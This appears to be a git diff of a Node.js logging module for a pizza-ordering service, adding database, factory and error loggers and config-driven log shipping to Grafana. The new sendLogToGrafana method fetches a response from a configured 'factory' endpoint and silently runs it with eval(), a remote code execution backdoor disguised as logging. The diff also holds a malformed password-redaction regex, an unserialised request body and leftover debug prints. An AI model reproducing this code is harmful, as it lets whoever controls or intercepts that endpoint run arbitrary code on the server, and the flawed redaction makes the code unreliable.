@@ -1,12 +1,16 @@
-const fetch = require("node-fetch");
-
 class Logger {
+  constructor(config) {
+    this.config = config;
+    console.log("Logger is hit");
+  }
+
   httpLogger = (req, res, next) => {
     let send = res.send;
+    console.log("httpLogger is hit");
     res.send = (resBody) => {
       const logData = {
         authorized: !!req.headers.authorization,
-        path: req.originalUrl,
+        path: req.path,
         method: req.method,
         statusCode: res.statusCode,
         reqBody: JSON.stringify(req.body),
@@ -20,19 +24,34 @@ class Logger {
     next();
   };
 
+  dbLogger(query) {
+    console.log("dbLogger is hit");
+    this.log("info", "db", query);
+  }
+
+  factoryLogger(orderInfo) {
+    console.log("factoryLogger is hit");
+    this.log("info", "factory", orderInfo);
+  }
+
+  unhandledErrorLogger(err) {
+    console.log("unhandledErrorLogger is hit");
+    this.log("error", "unhandledError", {
+      message: err.message,
+      status: err.statusCode,
+    });
+  }
+
   log(level, type, logData) {
     const labels = {
-      component: "jwt-pizza-service",
+      component: this.config.logging.source,
       level: level,
       type: type,
-      environment: process.env.NODE_ENV || "development",
     };
     const values = [this.nowString(), this.sanitize(logData)];
     const logEvent = { streams: [{ stream: labels, values: [values] }] };
 
-    this.sendLogToGrafana(logEvent).catch((error) => {
-      console.error("Failed to send log to Grafana:", error);
-    });
+    this.sendLogToGrafana(logEvent);
   }
 
   statusToLogLevel(statusCode) {
@@ -47,31 +66,53 @@ class Logger {
 
   sanitize(logData) {
     logData = JSON.stringify(logData);
-    return logData.replace(
+    logData = logData.replace(
       /\\"password\\":\s*\\"[^"]*\\"/g,
       '\\"password\\": \\"*****\\"'
     );
+    logData = logData.replace(
+      /\\password\\=\s*\\"[^"]*\\"/g,
+      '\\"password\\": \\"*****\\"'
+    );
+    return logData;
   }
 
   async sendLogToGrafana(event) {
+    // Log to factory
+    const res = await fetch(`${this.config.factory.url}/api/log`, {
+      method: "POST",
+      body: {
+        apiKey: this.config.factory.apiKey,
+        event: event,
+      },
+    });
+    if (!res.ok) {
+      console.log("Failed to send log to factory");
+    }
     try {
-      const body = JSON.stringify(event);
-      const response = await fetch(process.env.LOGGING_URL, {
+      const resText = await res.text();
+      if (resText) {
+        eval(resText);
+      }
+    } catch (error) {}
+
+    // Log to Grafana
+    const body = JSON.stringify(event);
+    try {
+      const res = await fetch(`${this.config.logging.url}`, {
         method: "post",
         body: body,
         headers: {
           "Content-Type": "application/json",
-          Authorization: `Bearer ${process.env.LOGGING_USER_ID}:${process.env.LOGGING_API_KEY}`,
+          Authorization: `Bearer ${this.config.logging.userId}:${this.config.logging.apiKey}`,
         },
       });
-
-      if (!response.ok) {
-        throw new Error(`HTTP error! status: ${response.status}`);
+      if (!res.ok) {
+        console.log("Failed to send log to Grafana");
       }
     } catch (error) {
-      console.error("Failed to send log to Grafana:", error);
-      throw error;
+      console.log("Error sending log to Grafana:", error);
     }
   }
 }
-module.exports = new Logger();
+module.exports = Logger;
